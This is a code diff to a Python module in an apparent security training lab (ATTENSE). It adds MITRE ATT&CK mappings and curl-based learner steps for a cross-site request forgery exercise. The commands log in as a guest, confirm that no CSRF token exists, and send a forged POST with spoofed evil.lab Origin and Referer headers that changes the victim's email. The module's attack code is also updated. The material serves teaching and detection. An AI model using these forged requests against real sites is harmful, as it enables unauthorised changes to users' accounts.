@@ -25,6 +25,17 @@ class CSRFModule(BaseModule):
     category = Category.WEB
     scenario_id = "APP-05"
     severity = Severity.MEDIUM
+    # MITRE ATT&CK — abuse a valid session via a malicious link to forge a
+    # state-changing request. (CSRF has no exact ATT&CK technique; mapped to the
+    # closest user-execution + data-manipulation behaviours.)
+    mitre = {
+        "tactics": ["TA0001 Initial Access", "TA0040 Impact"],
+        "techniques": [
+            {"id": "T1204.001", "name": "User Execution: Malicious Link", "tactic": "Execution"},
+            {"id": "T1565.001", "name": "Data Manipulation: Stored Data Manipulation", "tactic": "Impact"},
+            {"id": "T1078", "name": "Valid Accounts", "tactic": "Defense Evasion"},
+        ],
+    }
     lab = {
         "target_path": "/profile/",
         "vulnerable_component": "Flask profile update (profile_bp.update)",
@@ -35,18 +46,26 @@ class CSRFModule(BaseModule):
             "request from another page can silently change user data."
         ),
         "learner_steps": [
-            {"action": "Log into the target using guest:guest via the login page.",
-             "expected": "You are redirected to the profile page."},
-            {"action": "Open /profile/ and inspect the update form.",
-             "expected": "Notice there is no hidden CSRF token in the form."},
-            {"action": "Navigate to /evil/csrf-demo — the simulated attacker lure page.",
-             "expected": "A fake 'claim your reward' page appears."},
-            {"action": "Click 'Claim my reward' on the lure page.",
-             "expected": "The form silently POSTs to /profile/update and changes your email."},
-            {"action": "Return to /profile/ and verify your email was changed to hacked@evil.lab.",
-             "expected": "The profile now shows the attacker's email — proof of CSRF."},
+            {"action": "Establish a victim session (abuse a valid account).",
+             "technique": "T1078 Valid Accounts",
+             "command": "curl -s -c jar.txt -d 'username=guest&password=guest' http://target-agent/auth/login -o /dev/null",
+             "expected": "A session cookie is stored in jar.txt — you are 'the logged-in victim'."},
+            {"action": "Recon the update form — confirm there is NO anti-CSRF token.",
+             "technique": "T1595.002 Active Scanning: Vulnerability Scanning",
+             "command": "curl -s -b jar.txt http://target-agent/profile/ | grep -i csrf || echo 'no csrf token field'",
+             "expected": "The form has no hidden _csrf_token field — it is forgeable."},
+            {"action": "Forge a cross-origin state-changing POST (the lure click).",
+             "technique": "T1204.001 User Execution: Malicious Link",
+             "command": "curl -s -b jar.txt -H 'Origin: http://evil.lab' -H 'Referer: http://evil.lab/evil/csrf-demo' -d 'email=hacked@evil.lab' http://target-agent/profile/update | grep -i updated",
+             "expected": "The server accepts the forged request with no token / foreign Origin."},
+            {"action": "Verify the victim's data was changed (impact).",
+             "technique": "T1565.001 Data Manipulation: Stored Data Manipulation",
+             "command": "curl -s -b jar.txt http://target-agent/profile/ | grep hacked@evil.lab",
+             "expected": "The profile now shows the attacker's email — CSRF impact confirmed."},
             {"action": "Click Check Progress in ATTENSE to review the evidence.",
-             "expected": "Evidence includes csrf_lure_visited, csrf_lure_submitted, csrf_token_missing, and profile_changed_without_csrf."},
+             "technique": "T1565.001 Data Manipulation: Stored Data Manipulation",
+             "command": "# review the activity log / Wazuh feed in ATTENSE",
+             "expected": "Evidence includes csrf_token_missing and profile_changed_without_csrf."},
         ],
         "detection_rule": "Wazuh CSRF/mismatched-origin signature on /profile/update",
         "success_markers": [
@@ -58,7 +77,20 @@ class CSRFModule(BaseModule):
         ],
         "quick_probe": "/profile/",
     }
-    steps = [{'title': 'Acquire an authenticated session', 'hint': 'Log in as a known user to obtain the session cookie', 'expected': 'Cookie set by /auth/login'}, {'title': 'Forge state-changing POST', 'hint': 'POST /profile/update with no CSRF token, no Referer', 'expected': 'Server accepts the forged request (200 OK)'}, {'title': 'Verify the mutation succeeded', 'hint': 'Re-read /profile/ and confirm the email was changed', 'expected': 'Profile contains attacker-supplied value'}]
+    steps = [
+        {'title': 'Acquire an authenticated session', 'tactic': 'Defense Evasion',
+         'technique': 'T1078 Valid Accounts',
+         'command': "curl -s -c jar.txt -d 'username=guest&password=guest' http://target-agent/auth/login",
+         'hint': 'Log in as a known user to obtain the session cookie', 'expected': 'Cookie set by /auth/login'},
+        {'title': 'Forge state-changing POST', 'tactic': 'Execution',
+         'technique': 'T1204.001 User Execution: Malicious Link',
+         'command': "curl -s -b jar.txt -H 'Origin: http://evil.lab' -d 'email=pwned@evil.lab' http://target-agent/profile/update",
+         'hint': 'POST /profile/update with no CSRF token, no Referer', 'expected': 'Server accepts the forged request (200 OK)'},
+        {'title': 'Verify the mutation succeeded', 'tactic': 'Impact',
+         'technique': 'T1565.001 Data Manipulation: Stored Data Manipulation',
+         'command': "curl -s -b jar.txt http://target-agent/profile/ | grep pwned@evil.lab",
+         'hint': 'Re-read /profile/ and confirm the email was changed', 'expected': 'Profile contains attacker-supplied value'},
+    ]
 
     def options(self) -> list[ModuleOption]:
         return [
@@ -86,22 +118,24 @@ class CSRFModule(BaseModule):
         steps.append(r_login)
         self._log(log_fn, f"  Login: HTTP {r_login.status_code}")
 
-        # Step 2: Forged POST with no CSRF token and spoofed Origin
+        # Step 2: Forged POST with no CSRF token and a spoofed cross-origin
+        # Origin/Referer — exactly what the attacker lure page would send.
+        # Headers are applied *to the request itself* (T1204.001 lure click).
         self._log(log_fn, f"Sending CSRF payload (email → {new_email})...")
         forged_emails = [new_email, "exfil@attacker.lab"]
+        forged_headers = {
+            "Origin":  "http://evil.lab.local",
+            "Referer": target.base_url + "/evil/csrf-demo",
+        }
 
         for email in forged_emails:
             r = self._post(
                 target.base_url + "/profile/update",
                 data={"email": email},
+                headers=forged_headers,
                 label=f"csrf-{email}",
                 timeout=target.timeout,
             )
-            # Override headers for this request
-            self._session.headers.update({
-                "Origin": "http://evil.lab.local",
-                "Referer": "",
-            })
 
             changed = (
                 "Email updated successfully" in (r.detail or "")
@@ -115,10 +149,6 @@ class CSRFModule(BaseModule):
                 self._log(log_fn, f"  – no change detected  → {email}")
 
             steps.append(r)
-
-        # Clean up headers
-        self._session.headers.pop("Origin", None)
-        self._session.headers.pop("Referer", None)
 
         changed_count = sum(1 for s in steps if s.evidence)
         summary = f"{changed_count} forged state changes accepted without CSRF token."
